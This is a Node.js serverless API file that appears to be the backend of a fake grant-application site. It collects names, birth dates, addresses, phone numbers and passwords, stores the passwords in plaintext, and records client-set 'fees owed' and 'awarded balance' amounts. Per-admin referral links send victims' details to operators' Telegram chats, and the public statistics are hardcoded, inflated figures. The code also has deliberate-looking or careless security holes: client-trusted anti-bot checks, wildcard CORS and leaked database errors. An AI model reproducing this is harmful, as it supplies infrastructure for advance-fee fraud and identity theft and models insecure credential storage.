// api/app.js
// Handles ALL user-side functions: submit, status, stats, validate
// Telegram notifications are sent from the BROWSER via /api/telegram

import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

// ============================================================
// HELPERS
// ============================================================

function formatCurrency(amount, country) {
    const symbols = { USA: '$', CANADA: 'CA$', AUSTRALIA: 'AU$' };
    const symbol = symbols[country] || '$';
    return symbol + Number(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// ============================================================
// ROUTE HANDLERS
// ============================================================

const handlers = {
    // ============================================================
    // POST /submit - Submit application
    // ============================================================
    async submit(req, res) {
        try {
            const { application, token } = req.body;

            console.log('📥 Submit received:', { 
                hasApplication: !!application, 
                hasToken: !!token,
                email: application?.email 
            });

            if (!application) {
                return res.status(400).json({ success: false, error: 'Application data is required' });
            }

            // Validate required fields
            const required = ['firstName', 'lastName', 'email', 'phone', 'dob', 'password', 'address', 'city', 'stateProvince', 'postalCode', 'grantProgram', 'grantAmount', 'purposeStatement'];
            for (const field of required) {
                if (!application[field] || application[field].toString().trim() === '') {
                    return res.status(400).json({ success: false, error: `Missing required field: ${field}` });
                }
            }

            // Anti-bot checks
            const pageLoadTime = parseFloat(application.pageLoadTime) || 0;
            if (pageLoadTime < 3) {
                return res.status(400).json({ success: false, error: 'Security check failed. Please try again.' });
            }

            if (application.honeypot && application.honeypot.trim() !== '') {
                return res.status(400).json({ success: false, error: 'Security check failed. Please try again.' });
            }

            if (application.challengeAnswer !== application.challengeExpected) {
                return res.status(400).json({ success: false, error: 'Incorrect security answer. Please try again.' });
            }

            // Check duplicate email
            const { data: existing } = await supabase
                .from('grants_applications')
                .select('email')
                .eq('email', application.email)
                .maybeSingle();

            if (existing) {
                return res.status(400).json({ success: false, error: 'An application with this email already exists.' });
            }

            // Handle link validation - NEW: uses admin_links table
            let isLinkApp = false;
            let adminId = null;
            let linkId = null;
            let adminName = null;
            let adminChatId = null;
            let linkIdentifier = null;

            if (token) {
                // Check if link exists and is active
                const { data: linkData, error: linkError } = await supabase
                    .from('admin_links')
                    .select('*, admins!inner(id, full_name, telegram_chat_id)')
                    .eq('link_identifier', token)
                    .eq('is_active', true)
                    .single();

                if (linkError || !linkData) {
                    console.log('❌ Link validation failed:', linkError?.message);
                    return res.status(400).json({ 
                        success: false, 
                        error: 'Invalid or inactive link' 
                    });
                }

                // Link is valid and active - update usage count
                const { error: updateError } = await supabase
                    .from('admin_links')
                    .update({ 
                        updated_at: new Date().toISOString()
                    })
                    .eq('id', linkData.id);

                if (updateError) {
                    console.warn('⚠️ Failed to update link usage:', updateError);
                    // Continue anyway - don't block submission
                }

                isLinkApp = true;
                adminId = linkData.admin_id;
                linkId = linkData.id;
                linkIdentifier = linkData.link_identifier;
                adminName = linkData.admins?.full_name || null;
                adminChatId = linkData.admins?.telegram_chat_id || null;

                console.log('✅ Link validated:', { 
                    linkId: linkData.id, 
                    adminName: adminName,
                    adminChatId: adminChatId
                });
            }

            // Prepare data
            const dbData = {
                case_id: application.case_id,
                full_name: application.full_name || (application.firstName + ' ' + (application.middleName || '') + ' ' + application.lastName),
                first_name: application.firstName,
                middle_name: application.middleName || '',
                last_name: application.lastName,
                date_of_birth: application.dob,
                email: application.email,
                phone: application.phone,
                password: application.password,
                address: application.address,
                city: application.city,
                state_province: application.stateProvince,
                postal_code: application.postalCode,
                country: application.country || 'USA',
                id_type: application.idType || 'ID',
                id_number: 'N/A',
                id_document_ref: 'not_provided',
                grant_program: application.grantProgram,
                grant_program_name: application.grantProgramName || '',
                grant_amount: parseFloat(application.grantAmount) || 0,
                awarded_balance: parseFloat(application.awarded_balance) || 0,
                fees_owed: parseFloat(application.fees_owed) || 0,
                purpose_statement: application.purposeStatement,
                previous_applicant: application.previousApplicant || 'no',
                page_load_time: pageLoadTime,
                language_preference: application.language || 'en',
                status: 'pending',
                created_at: application.created_at || new Date().toISOString(),
                updated_at: new Date().toISOString(),
                admin_id: adminId,
                link_id: linkId,
                is_link_application: isLinkApp,
                application_source: isLinkApp ? 'link' : 'public'
            };

            // Insert into Supabase
            const { error: dbError } = await supabase
                .from('grants_applications')
                .insert([dbData]);

            if (dbError) {
                console.error('❌ DB error:', dbError);
                return res.status(500).json({ success: false, error: 'Database error: ' + dbError.message });
            }

            console.log('✅ Application saved:', dbData.case_id);

            // Return success with caseId and link info for browser-side Telegram
            return res.status(200).json({
                success: true,
                caseId: application.case_id,
                isLinkApp: isLinkApp,
                adminName: adminName,
                adminChatId: adminChatId,
                linkIdentifier: linkIdentifier,
                message: 'Application submitted successfully'
            });

        } catch (error) {
            console.error('❌ Submit error:', error);
            return res.status(500).json({ success: false, error: error.message || 'Internal server error' });
        }
    },

    // ============================================================
    // GET /status - Check application status
    // ============================================================
    async status(req, res) {
        try {
            const { caseId } = req.query;

            if (!caseId) {
                return res.status(400).json({ success: false, error: 'Case ID is required' });
            }

            const { data, error } = await supabase
                .from('grants_applications')
                .select('*')
                .eq('case_id', caseId)
                .maybeSingle();

            if (error) {
                return res.status(500).json({ success: false, error: 'Database error: ' + error.message });
            }

            if (!data) {
                return res.status(404).json({ success: false, error: 'No application found with this Case ID' });
            }

            delete data.password;
            delete data.id;

            return res.status(200).json({ success: true, data: data });

        } catch (error) {
            console.error('❌ Status error:', error);
            return res.status(500).json({ success: false, error: error.message || 'Internal server error' });
        }
    },

    // ============================================================
    // GET /stats - Public statistics
    // ============================================================
    async stats(req, res) {
        try {
            const { count: totalApplications } = await supabase
                .from('grants_applications')
                .select('*', { count: 'exact', head: true });

            const { data: fundedData } = await supabase
                .from('grants_applications')
                .select('awarded_balance')
                .eq('status', 'approved');

            const totalFunded = fundedData ? fundedData.reduce((sum, item) => sum + (parseFloat(item.awarded_balance) || 0), 0) : 0;

            return res.status(200).json({
                success: true,
                data: {
                    totalApplications: totalApplications || 0,
                    totalFunded: totalFunded || 0,
                    totalUsers: 650000,
                    totalAmount: 85000000
                }
            });

        } catch (error) {
            console.error('❌ Stats error:', error);
            return res.status(500).json({ success: false, error: error.message || 'Internal server error' });
        }
    },

    // ============================================================
    // GET /validate - Validate link (NEW - uses admin_links)
    // ============================================================
    async validate(req, res) {
        try {
            const { token } = req.query;

            if (!token) {
                return res.status(400).json({ success: false, error: 'Token required' });
            }

            // Check if link exists and is active
            const { data: linkData, error: linkError } = await supabase
                .from('admin_links')
                .select('*, admins!inner(id, full_name, telegram_chat_id)')
                .eq('link_identifier', token)
                .single();

            if (linkError || !linkData) {
                console.log('❌ Link not found:', token);
                return res.status(404).json({ 
                    success: false, 
                    error: 'Invalid link',
                    inactive: true
                });
            }

            // Check if link is active
            if (!linkData.is_active) {
                console.log('❌ Link is inactive:', token);
                return res.status(410).json({
                    success: false,
                    error: 'This link has been deactivated',
                    inactive: true,
                    data: {
                        referral_name: linkData.referral_name || null,
                        referral_amount: linkData.referral_amount || null
                    }
                });
            }

            // Link is valid and active
            console.log('✅ Link validated successfully:', token);

            return res.status(200).json({
                success: true,
                data: {
                    link_id: linkData.id,
                    admin_id: linkData.admin_id,
                    admin_name: linkData.admins?.full_name || null,
                    admin_chat_id: linkData.admins?.telegram_chat_id || null,
                    referral_name: linkData.referral_name || null,
                    referral_amount: linkData.referral_amount || null
                }
            });

        } catch (error) {
            console.error('❌ Validate error:', error);
            return res.status(500).json({ success: false, error: error.message || 'Internal server error' });
        }
    }
};

// ============================================================
// MAIN HANDLER
// ============================================================

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    try {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const pathname = url.pathname;

        console.log(`📥 ${req.method} ${pathname}`);

        let handlerFn = null;

        if (req.method === 'POST') {
            if (pathname === '/submit' || pathname === '/api/submit' || pathname === '/') {
                handlerFn = handlers.submit;
            }
        } else if (req.method === 'GET') {
            if (pathname === '/status' || pathname === '/api/status') {
                handlerFn = handlers.status;
            } else if (pathname === '/stats' || pathname === '/api/stats') {
                handlerFn = handlers.stats;
            } else if (pathname === '/validate' || pathname === '/api/applications/validate') {
                handlerFn = handlers.validate;
            }
        }

        if (!handlerFn) {
            console.log('❌ No handler for:', req.method, pathname);
            return res.status(404).json({ success: false, error: 'Not found' });
        }

        return await handlerFn(req, res);

    } catch (error) {
        console.error('❌ Handler error:', error);
        return res.status(500).json({
            success: false,
            error: error.message || 'Internal server error'
        });
    }
}
